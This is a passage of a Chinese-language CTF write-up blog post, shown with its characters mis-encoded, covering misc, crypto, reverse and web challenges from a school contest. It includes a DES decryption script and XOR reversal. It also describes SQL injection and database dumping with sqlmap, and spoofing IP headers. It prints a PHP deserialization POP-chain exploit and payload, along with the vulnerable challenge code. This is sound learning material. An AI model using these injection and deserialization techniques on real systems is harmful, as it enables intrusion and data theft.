---
title: æ ¡èµ›CTFåˆä½“éªŒ
date: '2024-5-9 22:18'
tags: CTF
description: å¹³å¹³æ— å¥‡çš„CTFå’¯~
abbrlink: 732c79d3
---

---

## Welcome to Evidenâ€™s Blog:`https://www.eviden.top/`(å¾ˆä¹…æ²¡æ›´æ–°å’¯~)

---

## Misc

**emmm,ä¹‹å‰ä¹Ÿä»æ¥æ²¡åšè¿‡miscçš„é¢˜,å°±æ˜¯è¾¹å­¦è¾¹æŸ¥è¾¹åšå‘—~**

> ä½ ä¹Ÿç©æ‹¼å›¾

è„šæœ¬å®‰è£…ç¯å¢ƒå•¥çš„è‡ªå·±å…·ä½“æŸ¥,pyè„šæœ¬å°å­è¿˜æ˜¯æœ‰å¿…è¦è¿‡è¿™ä¸€å…³çš„!

è¿™é‡Œç»™å‡ºæˆ‘çš„ç¤ºä¾‹å‘½ä»¤,å› ä¸ºå¼€å§‹æ²¡è·‘å‡ºæ¥

![](https://s1.vika.cn/space/2024/05/10/f709ebdcf6ca4d649a7b85be82651f98)

å‘½ä»¤:https://blog.csdn.net/m0_47643893/article/details/113778577

<img src="https://s1.vika.cn/space/2024/05/10/3426c89819614f08b42c273a7f295930" style="zoom:50%;" />

è‡ªå·±æ…¢æ…¢è¯•è¯•åç§»é‡åº”è¯¥å°±èƒ½è§£å‡ºæ¥äº†~(å­¦è¿‡ç§»ä½å¯†ç çš„å¯ä»¥ç›´æ¥æ ¹æ®ç¬¬ä¸€ä¸ªå­—ç¬¦å¾—å‡ºåç§»é‡~)

> #### é‡ç”Ÿä¹‹æˆ‘æ˜¯ctfç³•æ‰‹

æ‰“å¼€å‹ç¼©åŒ…ä¸€é¡¿æ,å‘ç°å­—ä½“æ˜¾ç¤ºå¼‚å¸¸,æœç´¢å¼•æ“å¼€æœå‘—

æ‰¾åˆ°ä¸€ä¸ªé›¶å®½å­—ç¬¦éšå†™çš„,okç›´æ¥æ‰¾ä¸ª[è§£å¯†ç½‘ç«™](http://330k.github.io/misc_tools/unicode_steganography.html)ä¸€æŠŠæ¢­~(æ³¨:è¿™é¢˜è§£å¯†ä¸è¦å¯†ç )

> #### ç­¾åˆ°é¢˜

é“å…·é¢˜,æ²¡å•¥æ„æ€,æ‰¾ä¸åˆ°å·¥å…·å°±è§£ä¸å‡ºé‚£å°±æé‚£æ™¾ç€,åé¢å‡ºé¢˜äººç»™å‡ºå·¥å…·äº†é‚£å°±è‡ªè¡Œç½‘ä¸Šä¸‹è½½å’¯,æ‹–åˆ°å·¥å…·ç­”æ¡ˆå°±å‡ºæ¥äº†.å·¥å…·å:SilentEye

> #### ç®€å•åŠ å¯†

**å¼€é¢˜ç»™çš„æç¤ºä¿¡æ¯å°±æ˜¯è§£å¯†å¯†ç .**

æ‰“å¼€å‹ç¼©åŒ…,çœ‹åˆ°base64ç„¶å jpgçš„æ ¼å¼æ˜æ˜¾æç¤ºä½  base64è½¬å›¾ç‰‡.(æˆ‘è¿™ç§ä»æ¥æ²¡å†™è¿‡miscçš„éƒ½èƒ½çœ‹å‡º,å„ä½å¤§ä½¬åº”è¯¥ç§’æ€æˆ‘lo~)

å¾—åˆ°å›¾ç‰‡å,åé¢åªè¦çŸ¥é“è§£å¯†å¯†ç æ˜¯å¼€é¢˜çš„æç¤ºä¿¡æ¯å³å¯.å…·ä½“ç»†èŠ‚æˆ‘ä¹Ÿè®°ä¸å¤ªæ¸…äº†~

---

## Crypto

emmm,å¯†ç å­¦ä¹Ÿåªæ˜¯ä¸Šè¿‡è¿™é—¨è¯¾.å°½åŠ›äº†,èƒ½å†™ä¸€é“å°±ç®—win!

> #### VigenÃ¨re

æ ‡é¢˜å°±æç¤ºä½ äº†å§æ˜¯ä»€ä¹ˆ,ç„¶åå‡ºé¢˜äººè¿˜ä¸€ç›´æç¤ºä½ .åšè¿‡ç‚¹å¯†ç å­¦éƒ½çŸ¥é“,ç»´å‰å°¼äºšå¯†ç .

ok,éšä¾¿æ‰¾ä¸ªç½‘ç«™,C-Vä¸€ä¸¢,flagå°±å‡ºæ¥äº†~

> #### ç­¾åˆ°é¢˜

Pyå¯†ç å­¦,åº”è¯¥æ˜¯des,è¿™ç‚¹è¦èƒ½åˆ¤æ–­å‡ºæ¥,å…·ä½“çš„åŠ å¯†ç‰¹å¾å’Œæ‰‹æ³•è¦äº†è§£,ç„¶åå°±chatgptå‚»ç“œå¼åšé¢˜äº†~

```py


_IP = [57, 49, 41, 33, 25, 17, 9, 1,
       59, 51, 43, 35, 27, 19, 11, 3,
       61, 53, 45, 37, 29, 21, 13, 5,
       63, 55, 47, 39, 31, 23, 15, 7,
       56, 48, 40, 32, 24, 16, 8, 0,
       58, 50, 42, 34, 26, 18, 10, 2,
       60, 52, 44, 36, 28, 20, 12, 4,
       62, 54, 46, 38, 30, 22, 14, 6
       ]


def IP(plain: list[int]):
    return list(map(lambda x: plain[x], _IP))


__pc1 = [56, 48, 40, 32, 24, 16, 8,
         0, 57, 49, 41, 33, 25, 17,
         9, 1, 58, 50, 42, 34, 26,
         6, 61, 53, 45, 37, 29, 21,
         18, 10, 2, 59, 51, 43, 35,
         62, 54, 46, 38, 30, 22, 14,
         13, 5, 60, 52, 44, 36, 28,
         20, 12, 4, 27, 19, 11, 3
         ]

__pc2 = [
    13, 16, 10, 23, 0, 4,
    2, 27, 14, 5, 20, 9,
    22, 18, 11, 3, 25, 7,
    43, 48, 38, 55, 33, 52,
    15, 6, 26, 19, 12, 1,
    40, 51, 30, 36, 46, 54,
    29, 39, 50, 44, 32, 47,
    45, 41, 49, 35, 28, 31
]
ROTATIONS = [1, 1, 2, 2, 3, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]


def PC_1(key: list[int]):
    return list(map(lambda x: key[x], __pc1))


def PC_2(key: list[int]):
    return list(map(lambda x: key[x], __pc2))


def get_sub_key(key: list[int]):
    key = PC_1(key)  # PC-1ç½®æ¢
    L, R = key[:28], key[28:]  # åˆ†æˆä¸¤åŠ

    skeys = []

    for i in range(16):
        for j in range(ROTATIONS[i]):  # æ ¹æ®è½®æ¬¡å·¦ç§»
            L = L[1:] + L[:1]
            R = R[1:] + R[:1]

        skeys.append(PC_2(L + R))  # PC-2ç½®æ¢

    return skeys


__expansion_table = [
    31, 0, 1, 2, 3, 4,
    3, 4, 5, 6, 7, 8,
    7, 8, 9, 10, 11, 12,
    11, 12, 13, 14, 15, 16,
    15, 16, 17, 18, 19, 20,
    19, 20, 21, 22, 23, 24,
    23, 24, 25, 26, 27, 28,
    27, 28, 29, 30, 31, 0
]
__sbox = [
    # S1
    [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
     0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
     4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
     15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],

    # S2
    [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
     3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
     0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
     13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],

    # S3
    [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
     13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
     13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
     1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],

    # S4
    [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
     13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
     10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
     3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],

    # S5
    [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
     14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
     4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
     11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],

    # S6
    [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
     10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
     9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
     4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],

    # S7
    [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
     13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
     1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
     6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],

    # S8
    [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
     1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
     7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
     2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
]
__p = [
    15, 6, 19, 20, 28, 11,
    27, 16, 0, 14, 22, 25,
    4, 17, 30, 9, 1, 7,
    23, 13, 31, 26, 2, 8,
    18, 12, 29, 5, 21, 10,
    3, 24
]


def EP(data: list[int]):  # æ‰©å±•ç½®æ¢
    return list(map(lambda x: data[x], __expansion_table))


def P(data: list[int]):  # Pç½®æ¢
    return list(map(lambda x: data[x], __p))


def F(index: int, R: list[int], skeys: list[list[int]]):
    """
    index: ä»£è¡¨è¿™æ˜¯ç¬¬å‡ è½®
    R: è¾“å…¥æ•°æ®
    skeys: å­å¯†é’¥æ•°ç»„
    """
    R = EP(R)  # æ‰©å±•ç½®æ¢
    R = list(map(lambda x, y: x ^ y, R, skeys[index]))  # å¼‚æˆ–

    B = [R[:6], R[6:12], R[12:18], R[18:24], R[24:30], R[30:36], R[36:42], R[42:]]  # åˆ†æˆå…«ä»½

    Bn = [0] * 32
    pos = 0
    for i in range(8):
        #  è®¡ç®—è¯¥ä½¿ç”¨Sç›’çš„è¡Œåæ ‡å’Œåˆ—åæ ‡
        row = (B[i][0] << 1) + B[i][5]
        col = (B[i][1] << 3) + (B[i][2] << 2) + (B[i][3] << 1) + B[i][4]

        sb = __sbox[i][(row << 4) + col]

        Bn[pos + 0] = (sb & 8) >> 3  # å››ä½è¾“å‡º
        Bn[pos + 1] = (sb & 4) >> 2
        Bn[pos + 2] = (sb & 2) >> 1
        Bn[pos + 3] = (sb & 1)

        pos += 4
    R = P(Bn)
    return R


_FP = [
    39, 7, 47, 15, 55, 23, 63, 31,
    38, 6, 46, 14, 54, 22, 62, 30,
    37, 5, 45, 13, 53, 21, 61, 29,
    36, 4, 44, 12, 52, 20, 60, 28,
    35, 3, 43, 11, 51, 19, 59, 27,
    34, 2, 42, 10, 50, 18, 58, 26,
    33, 1, 41, 9, 49, 17, 57, 25,
    32, 0, 40, 8, 48, 16, 56, 24
]


def FP(plain: list[int]):
    return list(map(lambda x: plain[x], _FP))


plain = b'********'
flag = b'HXCTF{%s}' % (plain)
key = b'12345678'

# è½¬ä¸ºäºŒè¿›åˆ¶æ•°ç»„
key = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in key])
plain = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in plain])
skeys = get_sub_key(key)

block = IP(plain)

L, R = block[:32], block[32:]
for i in range(16):
    tpR = R[:]
    R = F(i, R, skeys)
    R = list(map(lambda x, y: x ^ y, R, L))
    L = tpR
block = R + L
block = FP(block)
enc = bytes([int(''.join(map(str, block[i * 8:(i + 1) * 8])), 2) for i in range(8)])

print(enc)  # b'}\n<\xf5\xc8Q\x1cH'



ciphertext = b'\x12\xe9\xd2\xdf\x9bp\x1c\x99'
key = b'12345678'

# Convert key to binary array
key = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in key])

# Generate subkeys
skeys = get_sub_key(key)

# Convert ciphertext to binary array
ciphertext = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in ciphertext])

# Apply initial permutation
block = IP(ciphertext)

# Split block into two halves
L, R = block[:32], block[32:]

# Decrypt rounds
for i in range(16):
    tpR = R[:]
    R = F(15 - i, R, skeys)  # Note: Using subkeys in reverse order
    R = list(map(lambda x, y: x ^ y, R, L))
    L = tpR

# Swap L and R before final permutation
block = R + L

# Apply final permutation
block = FP(block)

# Convert binary array back to bytes
plaintext = bytes([int(''.join(map(str, block[i * 8:(i + 1) * 8])), 2) for i in range(8)])

print(plaintext)  # Output the decrypted plaintext

```

---

## Reverse

å¥½äº†,åˆæ˜¯ä¸ªè¾¹å†™è¾¹å­¦çš„è¿‡ç¨‹~

> #### happy_assebly

```æ±‡ç¼–
; void __cdecl enc(char *p)
.text:00401160 _enc            proc near               ; CODE XREF: _main+1Bâ†‘p
.text:00401160
.text:00401160 i               = dword ptr -4
.text:00401160 Str             = dword ptr  8
.text:00401160
.text:00401160                 push    ebp
.text:00401161                 mov     ebp, esp
.text:00401163                 push    ecx
.text:00401164                 mov     [ebp+i], 0
.text:0040116B                 jmp     short loc_401176
.text:0040116D ; ---------------------------------------------------------------------------
.text:0040116D
.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3Bâ†“j
.text:0040116D                 mov     eax, [ebp+i]
.text:00401170                 add     eax, 1
.text:00401173                 mov     [ebp+i], eax
.text:00401176
.text:00401176 loc_401176:                             ; CODE XREF: _enc+Bâ†‘j
.text:00401176                 mov     ecx, [ebp+Str]
.text:00401179                 push    ecx             ; Str
.text:0040117A                 call    _strlen
.text:0040117F                 add     esp, 4
.text:00401182                 cmp     [ebp+i], eax
.text:00401185                 jge     short loc_40119D
.text:00401187                 mov     edx, [ebp+Str]
.text:0040118A                 add     edx, [ebp+i]
.text:0040118D                 movsx   eax, byte ptr [edx]
.text:00401190                 xor     eax, 57h
.text:00401193                 mov     ecx, [ebp+Str]
.text:00401196                 add     ecx, [ebp+i]
.text:00401199                 mov     [ecx], al
.text:0040119B                 jmp     short loc_40116D
.text:0040119D ; ---------------------------------------------------------------------------
.text:0040119D
.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25â†‘j
.text:0040119D                 mov     esp, ebp
.text:0040119F                 pop     ebp
.text:004011A0                 retn
.text:004011A0 _enc            endp
Input: your flag
Encrypted result:0x1f, 0x0f, 0x14, 0x03, 0x11, 0x2c, 0x00, 0x32, 0x3b, 0x34, 0x38, 0x3a, 0x32, 0x08, 0x23, 0x38, 0x08, 0x03, 0x3f, 0x32, 0x08, 0x16, 0x04, 0x04, 0x12, 0x1a, 0x15, 0x1b, 0x0e, 0x08, 0x00, 0x18, 0x05, 0x1b, 0x13, 0x76, 0x2a
```

çœ‹å®Œä¹‹åä¹Ÿå°±æ˜¯ä¸ªå¼‚æˆ–æ“ä½œ,ä½ çŸ¥é“è¿™ä¸ªè¿™é¢˜å°±å¯ä»¥äº†.æœ€åç»™äº†ä¸ªåŠ å¯†çš„ç»“æœ,é‚£æˆ‘ä»¬å†é€†å›å»å°±æ˜¯äº†.ç›´æ¥å¼‚æˆ–æ“ä½œå³å¯

```c
void dec(char *p) {
    while (*p != '\0') {
        *p = *p ^ 0x57;
        p++;
    }
}
```

---

---



## Web

emmm,è¿™ä¸ªæ–¹å‘ç®—æ˜¯ç ”ç©¶è¿‡çš„,ç»ˆäºä¸æ˜¯é™Œç”Ÿçš„äº†~Oh,yeah

~~åªä¸è¿‡æ—¶é—´è¿˜æ˜¯ç•¥æ˜¾åŒ†å¿™,æœ€è¿‘äº‹æƒ…å¤ªå¤šäº†,æ²¡å¾ˆå¤šæ—¶é—´æ‰“è¿™ä¸ªæ¯”èµ›äº†,åŸºæœ¬ç„ä¸€çœ¼å°±è¿‡äº†,ä¸ä¼šçš„ä¹Ÿä¸æƒ³è´¹å¤ªå¤šæ—¶é—´,å› ä¸ºè¿˜æœ‰ä½œä¸šå’Œè€ƒè¯•,æ‚²å‚¬~~

å¥½æ³¢,Letâ€™s begin!

> #### è´ªåƒğŸ

é¢˜ç›®ç»™çš„æç¤º;**å¥½ç©çš„ğŸğŸï¼Œä½ èƒ½åƒåˆ°10000åˆ†å—**

ä¸€èˆ¬è¿™ç§é¢˜ç›®å°±æ˜¯jsæºç åˆ†æ,çœŸè¦ç©çš„10000åˆ†è§£å‡ºçš„flagé‚£æˆ‘ä½©æœä½ æ˜¯æ¸¸æˆå¤©æ‰(æˆ–è€…éäººç±»!)

å¼€é¢˜å…ˆåˆ«ç®¡æ¸¸æˆè§„åˆ™,è€è§„çŸ©F12çœ‹çœ‹å…ˆ!

å…ˆfæœç´¢ä¸€ä¸‹å…³é”®è¯,alert,æ²¡é”™å‘ç°å¥½ä¸œè¥¿äº†

![](https://s1.vika.cn/space/2024/05/10/fb4ca83a9a394e0cabf3c738927062f5)

å†æœè¿™ä¸ªå‡½æ•°

![](https://s1.vika.cn/space/2024/05/10/ed4f28419de442599eeb4aedcd3d2723)

æ˜çœ¼äººéƒ½çœ‹å¾—å‡ºæ˜¯base64å§,æ‹¿å»è§£å¯†å³å¯!

OK,ä¸åˆ°30sä¸€è¡€å°±æ‹¿ä¸‹äº†å‘—

> #### sqlinject

**ä½ èƒ½ç™»å½•å˜›ï¼Ÿ**

é¢˜ç›®ç»™çš„æç¤º: ~~ç”¨sqlmapæ˜¯æ²¡æœ‰çµé­‚çš„~~

çº¯è¯¯å¯¼æç¤ºæˆ‘åªèƒ½è¯´æ˜¯:å½“ç„¶ä½ è¯´åå‘æç¤ºä½ ä¹Ÿè¡Œ~

å¼€é¢˜é¡µé¢

![](https://s1.vika.cn/space/2024/05/10/9bd0b6fbea0d4ffaad98e62bd2f367c8)

å°±ä¸¤ä¸ªåœ°æ–¹å¯ä»¥æœ‰æœºä¼šå§.å½“ç„¶ç™»é™†æ¡†ä½ å¯ä»¥å»è¯•è¯•,æˆ‘æ˜¯ç”¨çš„å­—å…¸è·‘äº†ä¸¤è½®çš„,åº”è¯¥ä¸å¯èƒ½æœ‰æ³¨å…¥ç‚¹

è¿™æ¡è·¯èµ°ä¸é€šé‚£åªèƒ½æ¢å¦å¤–ä¸€ä¸ªnewså…¥æ‰‹äº†

![](https://s1.vika.cn/space/2024/05/10/d1d917e835054d8389ee5ec0a2169770)

è¿”å›çš„æ˜¯jsonæ ¼å¼,ä½†æ˜¯ä½ ä»”ç»†è§‚å¯Ÿä¸€ä¸‹url,å‘ç°å­˜åœ¨id=XXXçš„æƒ…å†µ,ok,è¿™ä¸å°±æ˜¯æ•™æä¸Šç»å…¸çš„sqlæ³¨å…¥é¢˜å‹å˜›.

å…ˆä¸æ€¥,æ‰‹å·¥éªŒè¯ä¸€ä¸‹,å…ˆä¸Šå­—å…¸åˆ¤æ–­å“ªç§æ³¨å…¥ç±»å‹.

![](https://s1.vika.cn/space/2024/05/10/7740300643ca4518ad3eefa4c678b070)

å‘ç°ä¹Ÿå°±æ˜¯å¾ˆæ™®é€šçš„sqlæ³¨å…¥ç±»å‹,åº”è¯¥ä¹Ÿæ˜¯æ²¡æœ‰è¿‡æ»¤çš„,å› æ­¤ç›´æ¥ä¸Šsqlmapå°±è¡Œ.

æ¥ä¸‹æ¥å°±æ˜¯sqlmapä¸€æŠŠæ¢­å“ˆäº†

è„±åº“ååŸºæœ¬çš„å¸¸è¯†ä½ è¦çŸ¥é“,è¿™ä¸ªå¯†ç ä¸€èˆ¬éƒ½ä¸æ˜¯æä¾›å…·ä½“çš„åŸå¯†ç ä¿å­˜åœ¨æœåŠ¡å™¨çš„,è€Œæ˜¯hashè¿‡çš„hashå€¼,å½“ç„¶sqlmapä¹Ÿä¼šæç¤ºä½ 

ä»¥åæ¸—é€æµ‹è¯•æ—¶ä¸è¦å‘è’™!è¿™ä¸ªåœ°æ–¹è¿˜åŸçš„å¾ˆç»å…¸,ç‚¹èµä¸€ä¸‹å‡ºé¢˜äºº~,å½“ç„¶ä¸è¦è½»æ˜“ç”¨sqlmapå»è„±åº“å“¦,å¯èƒ½ä¼šå¾ˆåˆ‘!

![](https://s1.vika.cn/space/2024/05/10/64cd71c47d104078bb50f07b0eb2969c)

ä¸Šé¢é‚£ä¸ªè²Œä¼¼æ˜¯ä¸ªå‡çš„åº“,ç”¨adminçš„å¯†ç ç™»ä¸ä¸Š,åæ­£ä¸€ä¸ªä¸ªè¡¨éªŒè¯å°±è¡Œäº†

æœ€åå¾—å‡ºæ˜¯ä¸‹é¢è¿™ä¸ªå¯†ç æœ‰æ•ˆ,å†å›åˆ°åŸæ¥loginé¡µé¢ç™»é™†å³å¯æ‹¿åˆ°flag!

![](https://s1.vika.cn/space/2024/05/10/fbe24020c62b42d8abecfcf2b90b1390)

> #### http

å¼€é¢˜é¡µé¢

![](https://s1.vika.cn/space/2024/05/10/2afecd31e20e45bf82fdfece3e778ae5)

ç»å…¸å…¥é—¨æ”¹æ•°æ®åŒ…,å¾ˆå¥½å¥‡è¿™é¢˜ä¸ºå•¥ä¸æ”¾ç¬¬ä¸€å¤©(sqlé‚£ä¸ªé¢˜åº”è¯¥å¯ä»¥è·Ÿè¿™ä¸ªæ¢ä¸€ä¸‹çš„æˆ‘è§‰å¾—)

BPå¯åŠ¨å§è¿˜æ˜¯,å®åœ¨ä¸ä¼šä½ å¯ä»¥csdnæœä¸€ä¸‹ç±»ä¼¼çš„æ”¹å¤´çš„æ‰‹æ³•.å½“ç„¶è¿™é‡Œæœ‰ä¸ªå‘

ç¬¬äº”ä¸ªæ¡ä»¶æ˜¯è¦ä½ æ”¹IP,ä¸€èˆ¬å°±æ˜¯XFFå¤´å°±å¤Ÿäº†~

ä½†æ˜¯è¿™é‡Œå‡ºé¢˜çš„æ¶å¿ƒä½ ä¸€æ‰‹,æ”¹XFFåº”è¯¥æ˜¯ä¸å¤Ÿçš„,ä»–ä¸ä¼šè®©ä½ è¿‡

è¿™æ—¶å€™éœ€è¦BPçš„ä¸€ä¸ªæ’ä»¶`fakeIP`[è¯¦æƒ…çœ‹](https://blog.csdn.net/weixin_44203158/article/details/107234784)

æœ‰æ’ä»¶åº”è¯¥å°±å¾ˆå¥½ä¼ªé€ äº†~

> #### easy_rce

å¼€é¢˜

```php
<?php
highlight_file(__FILE__);
$code = $_GET['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
    die("ä½ ä¸å‡†ç©åŸç¥");
}
@eval($code);
?>
```

emmmè¿™å¥½åƒæ˜¯ä¸ªåŸé¢˜å§,åªèƒ½è¯´ä¸€ç‚¹æ„æ€æ²¡æœ‰,ä¸€æ¨¡ä¸€æ ·å•¥éƒ½ä¸æ”¹

[è¿™ä¸ªblogå¯¹æ— å­—æ¯äº§ç”Ÿè®²çš„å¾ˆæ¸…æ¥šäº†,ä¸€äº›è„šæœ¬ä½ ä¹Ÿå¯ä»¥è‡ªå·±ç¼–å†™æˆ–è€…æ€è€ƒå˜å½¢,å†å…·ä½“çš„åé¢å…æ€çš„æ—¶å€™æœ‰ç”¨!](https://www.cnblogs.com/pursue-security/p/15404150.html)

å¼‚æˆ–ç»•è¿‡æˆ–è€…å–ååº”è¯¥éƒ½è¡Œ(`æ ¹æ®é‚£ä¸ªæ­£åˆ™åº”è¯¥å°±æ˜¯ä¸èƒ½å‡ºç°å¹³å¸¸çš„å­—ç¬¦,å› æ­¤è¿™ä¸ªæ‰‹æ³•ä¹Ÿå«æ— å­—æ¯rce`)

å…·ä½“æ›´å¤šçš„php çš„ä¸€äº›rceæ‰‹æ³•å¯ä»¥çœ‹æˆ‘è‡ªå·±çš„blogæ€»ç»“[Evidenâ€™s Blog](https://www.eviden.top/2024/03/07/2024-03-07-RCE%E7%BB%95%E8%BF%87%E5%90%84%E7%A7%8D%E9%AA%9A/)

æ‰“ä¸å¼€å»ºè®®ç”¨é­”æ³•è®¿é—®,é¡µé¢æ‰˜ç®¡åœ¨å›½å¤–å¹³å°,å›½å†…DNSå¤§éƒ¨åˆ†è¢«æ±¡æŸ“äº†,æœ‰ç‚¹æ…¢æˆ–è€…æ— æ³•è®¿é—®éƒ½æ˜¯æ­£å¸¸~

> #### easy_pop

é¢˜ç›®æç¤º;ç®€å•ååºåˆ—åŒ–

é‚£å°±æŒ‰ä»–è¯´çš„ç®€å•çš„ååºåˆ—åŒ–æ¥å‘—~

å¼€é¢˜:

è¿™æ˜¯æºç 

```php
 <?php

highlight_file(__File__);

class rank1{
    public $r1a;
    public $r1b;
    public function __construct(){
        $this->r1a='aaa';
        $this->r1b='123456';
    }
    
    public function __call($a,$b){
        $this->r1a->{$this->r1b}();
        return 0;
    }
}

class rank2{
    public $r2a;
    public function __toString(){
        $this->r2a->GetFiag();
        return 0;
    }
}

class rank3{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'r3a' && $this->passwd ==='r3b'){
            include('flag.php');
            echo $flag; 
        }
    }
}

class rank4{
    public $r4a;
    public function __construct(){
        $this->r4a='hello,world';
    }
    public function __destruct(){
        echo $this->r4a;
    }
}
$pass=isset($_GET["pass"])?$_GET["pass"]:null;
if($pass!=null&&!preg_match("/\x{00}/i",$pass))
{
    unserialize($pass);
}
?> 
```

æˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸€äº›phpçš„é­”æœ¯æ–¹æ³•:`__construct()`  `__destruct()` `__toString()` `__call($a,$b)`

å°±è¿™äº›äº†,ä¸ç®—å¤š~å…·ä½“è§¦å‘æ‰‹æ³•ä½ å»æœä¸€ä¸‹,ååºåˆ—åŒ–æ¼æ´è¿˜æ˜¯å¾ˆé‡è¦çš„!

ok,å¼€å§‹ä»£ç å®¡è®¡

æˆ‘ä»¬è§¦å‘çš„é¡ºåºå°±æ˜¯:3<---1<---2<---4,åç€æ¨å°±è¡Œ

```php
<?php 
//3<---1<---2<---4
class rank3{
    private $admin = 'aaa';
    protected $passwd = '123456';
	public function __construct(){
		$this->admin ='r3a';
		$this->passwd = 'r3b';
	}

}

class rank1{
	public $r1a;
    public $r1b;
	public function __construct(){
        $this->r1a=new rank3();
        $this->r1b='Getflag';
    }

}

class rank2{
	public $r2a;
	public function __construct(){
		$this->r2a = new rank1();
	}
}
class rank4{
	public $r4a;
	public function __construct(){
        $this->r4a=new rank2();
    }
}

//3<---1<---2<---4
$a=new rank4();
echo serialize( $a )."\n";
echo urlencode(serialize($a));

// %00å¦‚ä½•ç»•è¿‡???
//https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html

// /00->%00
// O:5:"rank4":1:{s:3:"r4a";O:5:"rank2":1:{s:3:"r2a";O:5:"rank1":2:{s:3:"r1a";O:5:"rank3":2:{S:12:"\00rank3\00admin";s:3:"r3a";S:9:"\00*\00passwd";s:3:"r3b";}s:3:"r1b";s:7:"Getflag";}}}
// https://xz.aliyun.com/t/6454?time__1311=n4%2BxnD0DRDB73RDfx05%2BbDyimC0QQDg7iABoD&alichlgref=https%3A%2F%2Fwww.google.com%2F
```

è¿™æ˜¯æˆ‘æŒ‰ç…§popé“¾çš„é¡ºåºæ¨å‡ºæ¥EXP,æ”¹åœ¨ä¸Šé¢,æˆ‘ä¸ªäººå–œæ¬¢ç”¨`__construct()`æ–¹æ³•ä¼ é€’å¯¹è±¡æˆ–ç»™å‚æ•°èµ‹å€¼,ç½‘ä¸Šå¤§éƒ¨åˆ†æ˜¯é‚£ä¸ªä»€ä¹ˆåˆ›å»ºå®Œå¯¹è±¡åå†ä¼ æ¥ä¼ å».é‚£ä¸ª`->`çœ‹å¾—æˆ‘æ˜¯åˆè‡­åˆé•¿.ä¸ªäººçˆ±å¥½,å‹¿å–·

è¿™é‡Œå‡ºé¢˜äººè¿˜ç»™äº†ä¸ªæ¶å¿ƒä½ çš„ç‚¹`if($pass!=null&&!preg_match("/\x{00}/i",$pass))`

è¿™ä¸ªæ­£åˆ™è¯´äººè¯å°±æ˜¯åŒ¹é…`%00`.

ä¸ºä»€ä¹ˆä¼šåºåˆ—åŒ–åå‡ºç°`%00`,è¿™ä¸ªä½ è‡ªå·±å»æ‰¾èµ„æ–™æˆ–è€…æ˜¯å­¦ä¹ ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´å…¥ä¸ªé—¨å…ˆ,åˆ«æ€¥ç€å°±ä¼šå†™é¢˜

æˆ‘åœ¨ä»£ç æ³¨é‡Šåé¢å†™äº†èµ„æ–™~,è‡ªå·±çœ‹å§!

æœ€ç»ˆPayload: 

`O:5:"rank4":1:{s:3:"r4a";O:5:"rank2":1:{s:3:"r2a";O:5:"rank1":2:{s:3:"r1a";O:5:"rank3":2:{S:12:"\00rank3\00admin";s:3:"r3a";S:9:"\00*\00passwd";s:3:"r3b";}s:3:"r1b";s:7:"Getflag";}}}`

> #### upup

~~åªéœ€è¦ä¸€ç‚¹å°å°çš„å®¡è®¡ï¼Œè¯¦æƒ…ä»£ç çœ‹é™„ä»¶å™¢~~

